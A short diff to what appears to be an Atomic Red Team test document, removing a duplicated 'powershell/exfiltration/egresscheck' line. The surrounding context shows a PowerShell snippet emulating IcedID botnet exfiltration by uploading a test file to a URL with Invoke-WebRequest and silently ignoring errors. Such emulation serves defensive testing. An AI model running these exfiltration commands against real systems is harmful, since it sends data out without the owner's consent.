@@ -40,7 +40,6 @@ $file = New-Item -Force $fileName -Value "This is ART IcedID Botnet Exfil Test"
 $contentType = "application/octet-stream"
 try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}
 powershell/exfiltration/egresscheck
-powershell/exfiltration/egresscheck
 ```
 
 ## Commands Dataset
